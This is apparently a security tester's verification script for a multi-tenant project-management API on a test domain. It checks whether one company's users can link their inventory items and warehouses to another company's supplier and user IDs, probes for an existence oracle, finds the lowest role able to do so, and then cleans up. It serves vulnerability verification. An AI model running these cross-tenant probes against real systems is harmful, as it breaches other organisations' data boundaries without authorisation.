'use strict';
// Independent check of L5 (scratch). Attacker = company 030, victim = company 040.
const crypto = require('crypto');
const { as } = require('../../lib/api');

const mail = (who, code) => `${who}@c${code}.octapm-cert.test`;
const listOf = (d) => (Array.isArray(d) ? d : d?.items || d?.rows || d?.data || []);
const tag = () => Math.random().toString(36).slice(2, 8).toUpperCase();
const line = (s) => console.log(s);
const err = (r) => (r.body?.error ? ` ${r.body.error.code}: ${r.body.error.message}` : '');

(async () => {
  const pm30 = as(mail('pm', '030'));
  const pm40 = as(mail('pm', '040'));

  // 0. Are these really two companies?
  const me30 = (await pm30.send('GET', '/auth/me')).body?.data;
  const me40 = (await pm40.send('GET', '/auth/me')).body?.data;
  const org30 = me30?.orgId ?? me30?.user?.orgId ?? me30?.org?.id;
  const org40 = me40?.orgId ?? me40?.user?.orgId ?? me40?.org?.id;
  line(`[0] pm@c030 orgId=${org30}  pm@c040 orgId=${org40}  different=${Boolean(org30 && org40 && org30 !== org40)}`);

  // 1. Victim's supplier and user, fetched as the victim.
  const projects40 = listOf((await pm40.send('GET', '/projects')).body?.data);
  let sup = null; let supProject = null;
  for (const p of projects40) {
    const s = listOf((await pm40.send('GET', `/projects/${p.id}/procurement/suppliers`)).body?.data);
    if (s.length) { sup = s[0]; supProject = p; break; }
  }
  const users40 = listOf((await pm40.send('GET', '/users')).body?.data);
  const victimUser = users40.find((u) => u.email === mail('warehouse', '040')) || users40[0];
  line(`[1] victim supplier ${sup.id} "${sup.name}" (project ${supProject.id}); victim user ${victimUser.id} "${victimUser.name}"`);

  // 2. Can the attacker reach either by legitimate means?
  const direct = await pm30.send('GET', `/projects/${supProject.id}/procurement/suppliers`);
  line(`[2a] pm@c030 GET /projects/<040 project>/procurement/suppliers -> ${direct.status}${err(direct)}`);
  const projects30 = listOf((await pm30.send('GET', '/projects')).body?.data);
  let inOwn = false; let ownSupplierNames = 0; let nameInOwn = false;
  for (const p of projects30) {
    const s = listOf((await pm30.send('GET', `/projects/${p.id}/procurement/suppliers`)).body?.data);
    ownSupplierNames += s.length;
    if (s.some((x) => x.id === sup.id)) inOwn = true;
    if (s.some((x) => x.name === sup.name)) nameInOwn = true;
  }
  line(`[2b] 030 has ${projects30.length} projects / ${ownSupplierNames} suppliers; victim supplier id among them=${inOwn}; victim supplier name among them=${nameInOwn}`);
  const users30 = listOf((await pm30.send('GET', '/users')).body?.data);
  line(`[2c] 030 has ${users30.length} users; victim user id among them=${users30.some((u) => u.id === victimUser.id)}; victim name among them=${users30.some((u) => u.name === victimUser.name)}`);

  const made = { items: [], whs: [] };

  // 3. Unknown UUID: what does a miss look like (existence oracle)?
  const ghost = crypto.randomUUID();
  const g1 = await pm30.send('POST', '/inventory/items', { sku: `L5C-G-${tag()}`, name: 'L5 check ghost', unit: 'ea', preferredSupplierId: ghost });
  line(`[3a] POST /inventory/items preferredSupplierId=<random uuid> -> ${g1.status}${err(g1)} preferredSupplier=${JSON.stringify(g1.body?.data?.preferredSupplier)}`);
  if (g1.body?.data?.id) made.items.push(g1.body.data.id);
  const g2 = await pm30.send('POST', '/inventory/warehouses', { code: `L5C-G-${tag()}`, name: 'L5 check ghost wh', managerId: ghost });
  line(`[3b] POST /inventory/warehouses managerId=<random uuid> -> ${g2.status}${err(g2)} manager=${JSON.stringify(g2.body?.data?.manager)}`);
  if (g2.body?.data?.id) made.whs.push(g2.body.data.id);

  // 4. PATCH path: clean records first, then point them at the victim.
  const cleanItem = await pm30.send('POST', '/inventory/items', { sku: `L5C-I-${tag()}`, name: 'L5 check item', unit: 'ea' });
  const itemId = cleanItem.body?.data?.id; if (itemId) made.items.push(itemId);
  line(`[4a] clean item -> ${cleanItem.status} preferredSupplier=${JSON.stringify(cleanItem.body?.data?.preferredSupplier)}`);
  const pItem = await pm30.send('PATCH', `/inventory/items/${itemId}`, { preferredSupplierId: sup.id });
  line(`[4b] PATCH /inventory/items/:id preferredSupplierId=<040 supplier> -> ${pItem.status}${err(pItem)} preferredSupplier=${JSON.stringify(pItem.body?.data?.preferredSupplier)}`);
  const gItem = await pm30.send('GET', `/inventory/items/${itemId}`);
  const gd = gItem.body?.data?.item || gItem.body?.data;
  line(`[4c] GET /inventory/items/:id -> ${gItem.status} preferredSupplier=${JSON.stringify(gd?.preferredSupplier)}; keys with 'supplier': ${Object.keys(gd || {}).filter((k) => /supplier/i.test(k)).join(',')}`);

  const cleanWh = await pm30.send('POST', '/inventory/warehouses', { code: `L5C-W-${tag()}`, name: 'L5 check wh' });
  const whId = cleanWh.body?.data?.id; if (whId) made.whs.push(whId);
  const pWh = await pm30.send('PATCH', `/inventory/warehouses/${whId}`, { managerId: victimUser.id });
  line(`[4d] PATCH /inventory/warehouses/:id managerId=<040 user> -> ${pWh.status}${err(pWh)} manager=${JSON.stringify(pWh.body?.data?.manager)}`);
  line(`[4e] whole warehouse answer: ${JSON.stringify(pWh.body?.data)}`);

  // 5. Lowest role that can do it in 030.
  for (const who of ['warehouse', 'procurement', 'site', 'qs', 'finance', 'quality']) {
    const s = as(mail(who, '030'));
    let r;
    try { r = await s.send('POST', '/inventory/items', { sku: `L5C-R-${tag()}`, name: `L5 check ${who}`, unit: 'ea', preferredSupplierId: sup.id }); }
    catch (e) { line(`[5] ${who}@c030 -> sign-in/transport failure: ${e.message}`); continue; }
    if (r.body?.data?.id) made.items.push(r.body.data.id);
    line(`[5] ${who}@c030 POST /inventory/items with 040 supplier -> ${r.status}${err(r)} preferredSupplier=${JSON.stringify(r.body?.data?.preferredSupplier)}`);
  }

  // 6. Victim side: does anything of 030's appear in 040?
  const wh40 = as(mail('warehouse', '040'));
  const vWh = listOf((await wh40.send('GET', '/inventory/warehouses')).body?.data);
  const vIt = listOf((await pm40.send('GET', '/inventory/items')).body?.data);
  line(`[6] victim warehouse@c040 sees 030's warehouse? ${vWh.some((w) => made.whs.includes(w.id))}; victim pm sees 030's items? ${vIt.some((i) => made.items.includes(i.id))}`);
  const supAfter = listOf((await pm40.send('GET', `/projects/${supProject.id}/procurement/suppliers`)).body?.data).find((s) => s.id === sup.id);
  line(`[6b] victim supplier unchanged? ${JSON.stringify(supAfter) === JSON.stringify(sup)}`);

  // cleanup: detach then archive
  for (const id of made.items) await pm30.send('PATCH', `/inventory/items/${id}`, { preferredSupplierId: null, status: 'archived' });
  for (const id of made.whs) await pm30.send('PATCH', `/inventory/warehouses/${id}`, { managerId: null, status: 'archived' });
  line(`(cleanup) detached and archived ${made.items.length} items, ${made.whs.length} warehouses`);
})().catch((e) => { console.error(e); process.exitCode = 1; });
